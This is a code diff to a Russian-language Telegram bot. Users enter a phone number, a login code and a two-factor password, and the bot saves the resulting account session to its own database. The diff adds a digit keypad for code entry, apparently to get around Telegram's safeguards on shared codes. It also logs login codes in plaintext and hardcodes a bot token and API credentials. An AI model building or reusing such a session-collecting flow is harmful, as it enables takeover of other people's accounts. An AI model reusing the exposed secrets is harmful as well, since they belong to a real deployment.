@@ -13,14 +13,14 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.storage.memory import MemoryStorage
 from telethon.tl.types import InputPeerChannel, Channel
 from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError
 from telethon.errors.rpcerrorlist import PhoneNumberInvalidError
 from datetime import datetime, timedelta
 import random
 import aiosqlite
 
 API_TOKEN = '7695275246:AAH6YVL0l6WGvRIjDOhDveiu-bFk4oE1gck'
-ADMIN_IDS = [1930733528, 7950926692]
+ADMIN_IDS = [1930733528, 7950926692, 1083294848]
 TELEGRAM_API_ID = '20996594'
 TELEGRAM_API_HASH = 'aa91bd7c0ffccf2750f3b4dc6f97cc31'
 BUY_LINK = "https://t.me/Vlktor_dnr"
@@ -31,6 +31,7 @@ if not os.path.exists('temp_photos'):
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 session = AiohttpSession()
 bot = Bot(token=API_TOKEN, session=session, default=DefaultBotProperties(parse_mode='HTML'))
@@ -687,80 +688,112 @@ async def check_subscription_expiration():
 
 # ================== ДОБАВЛЕНИЕ АККАУНТА ===================
 
+def get_code_input_keyboard():
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="1", callback_data="code_1"), InlineKeyboardButton(text="2", callback_data="code_2"), InlineKeyboardButton(text="3", callback_data="code_3")],
+        [InlineKeyboardButton(text="4", callback_data="code_4"), InlineKeyboardButton(text="5", callback_data="code_5"), InlineKeyboardButton(text="6", callback_data="code_6")],
+        [InlineKeyboardButton(text="7", callback_data="code_7"), InlineKeyboardButton(text="8", callback_data="code_8"), InlineKeyboardButton(text="9", callback_data="code_9")],
+        [InlineKeyboardButton(text="0", callback_data="code_0")]
+    ])
+    return keyboard
+
+# Хендлер для добавления аккаунта
 @dp.message(F.text == "🗝️ Добавить аккаунт")
-async def add_account(message: Message, state: FSMContext):
+async def add_account(message: types.Message, state: FSMContext):
     await message.answer("<b>📞 Введите номер телефона (в формате 9123456789).</b>")
     await state.set_state(AccountStates.waiting_for_phone)
 
+# Хендлер для обработки номера телефона
 @dp.message(AccountStates.waiting_for_phone)
-async def process_phone(message: Message, state: FSMContext):
+async def process_phone(message: types.Message, state: FSMContext):
     phone_number = message.text.strip()
     
+    # Проверяем формат номера
     if not phone_number.isdigit() or len(phone_number) < 10:
         await message.answer("<b>❌ Неверный формат номера телефона. Пожалуйста, введите корректный номер.</b>")
         await state.clear()
         return
     
-    user_id = message.from_user.id
-
     session_path = f'sessions/{phone_number}.session'
     if not os.path.exists('sessions'):
         os.mkdir('sessions')
 
     client = TelegramClient(session_path, TELEGRAM_API_ID, TELEGRAM_API_HASH)
-    
+
+    # Попробуем подключиться к Telegram
     try:
+        logger.info("Подключаемся к клиенту Telegram...")
         await client.connect()
 
+        # Проверяем, авторизован ли пользователь
         if not await client.is_user_authorized():
+            logger.info(f"Запрашиваем код для номера: {phone_number}")
             await client.send_code_request(phone_number)
-            await message.answer(f"<b>📲 Код отправлен на номер {phone_number}.</b> Введите его.")
-            await state.update_data(phone_number=phone_number, client=client)
+            await message.answer(f"<b>📲 Код отправлен на номер {phone_number}.</b> Введите его с помощью кнопок ниже.")
+
+            # Отправляем инлайн-клавиатуру для ввода кода
+            await state.update_data(phone_number=phone_number, client=client, code='')
+            await message.answer("Ваш ввод: ", reply_markup=get_code_input_keyboard())
             await state.set_state(AccountStates.waiting_for_code)
         else:
             await message.answer("<b>✅ Этот номер уже авторизован.</b>")
             await state.clear()
-    
+
     except PhoneNumberInvalidError:
         await message.answer(f"<b>❌ Неверный номер телефона: {phone_number}. Пожалуйста, введите корректный номер.</b>")
         await state.clear()
         return
     
     except Exception as e:
+        logger.error(f"Ошибка при попытке подключения: {e}")
         await message.answer(f"<b>❌ Ошибка при обработке номера телефона: {e}</b>")
         await state.clear()
         return
 
-
-@dp.message(AccountStates.waiting_for_code)
-async def process_code(message: Message, state: FSMContext):
-    code = message.text
+# Хендлер для обработки нажатий на кнопки с цифрами кода
+@dp.callback_query(AccountStates.waiting_for_code, lambda c: c.data.startswith('code_'))
+async def process_code_digit(callback_query: types.CallbackQuery, state: FSMContext):
+    digit = callback_query.data.split('_')[1]
     user_data = await state.get_data()
-    phone_number = user_data['phone_number']
-    client = user_data['client']
+    current_code = user_data.get('code', '') + digit
 
-    try:
-        await client.sign_in(phone_number, code)
-        session_string = client.session.save()
-        async with aiosqlite.connect('bot_database.db') as db:
-            await db.execute('INSERT INTO accounts (user_id, phone_number, session) VALUES (?, ?, ?)', 
-                             (message.from_user.id, phone_number, session_string))
-            await db.commit()
+    # Обновляем введенные цифры в сообщении
+    new_text = f"Ваш ввод: {current_code}"
+    await callback_query.message.edit_text(new_text, reply_markup=get_code_input_keyboard())
 
-        await message.answer(f"<b>🗝️ Аккаунт {phone_number} успешно добавлен.</b>")
-        await state.clear()
+    if len(current_code) < 5:
+        await state.update_data(code=current_code)
+        await callback_query.answer()  # Уведомляем о нажатии
+    else:
+        # Когда код полностью набран (5 цифр)
+        phone_number = user_data['phone_number']
+        client = user_data['client']
+        
+        try:
+            logger.info(f"Попытка входа с кодом {current_code} для номера {phone_number}")
+            await client.sign_in(phone_number, current_code)
+            session_string = client.session.save()
+            async with aiosqlite.connect('bot_database.db') as db:
+                await db.execute('INSERT INTO accounts (user_id, phone_number, session) VALUES (?, ?, ?)', 
+                                 (callback_query.from_user.id, phone_number, session_string))
+                await db.commit()
 
-    except SessionPasswordNeededError:
-        await message.answer("<b>🔐 Этот аккаунт защищен двухфакторной аутентификацией. Введите пароль:</b>")
-        await state.update_data(client=client)
-        await state.set_state(AccountStates.waiting_for_password)
+            await callback_query.message.edit_text(f"<b>🗝️ Аккаунт {phone_number} успешно добавлен.</b>")
+            await state.clear()
 
-    except Exception as e:
-        await message.answer(f"<b>❌ Ошибка авторизации:</b> {e}")
-        await state.clear()
+        except SessionPasswordNeededError:
+            await callback_query.message.answer("<b>🔐 Этот аккаунт защищен двухфакторной аутентификацией. Введите пароль:</b>")
+            await state.update_data(client=client)
+            await state.set_state(AccountStates.waiting_for_password)
 
+        except Exception as e:
+            logger.error(f"Ошибка авторизации: {e}")
+            await callback_query.message.edit_text(f"<b>❌ Ошибка авторизации:</b> {e}")
+            await state.clear()
+
+# Хендлер для обработки пароля
 @dp.message(AccountStates.waiting_for_password)
-async def process_password(message: Message, state: FSMContext):
+async def process_password(message: types.Message, state: FSMContext):
     password = message.text
     user_data = await state.get_data()
     client = user_data['client']
@@ -777,7 +810,14 @@ async def process_password(message: Message, state: FSMContext):
         await message.answer(f"<b>🗝️ Аккаунт {phone_number} успешно добавлен с двухфакторной аутентификацией.</b>")
         await state.clear()
 
+    # Обрабатываем ошибку неверного пароля и завершаем процесс
+    except PasswordHashInvalidError:
+        logger.error(f"Неверный пароль для 2FA для {user_data['phone_number']}")
+        await message.answer("<b>❌ Неверный пароль двухфакторной аутентификации. Процесс завершён.</b>")
+        await state.clear()
+
     except Exception as e:
+        logger.error(f"Ошибка авторизации с паролем: {e}")
         await message.answer(f"<b>❌ Ошибка авторизации:</b> {e}")
         await state.set_state(AccountStates.waiting_for_password)
 
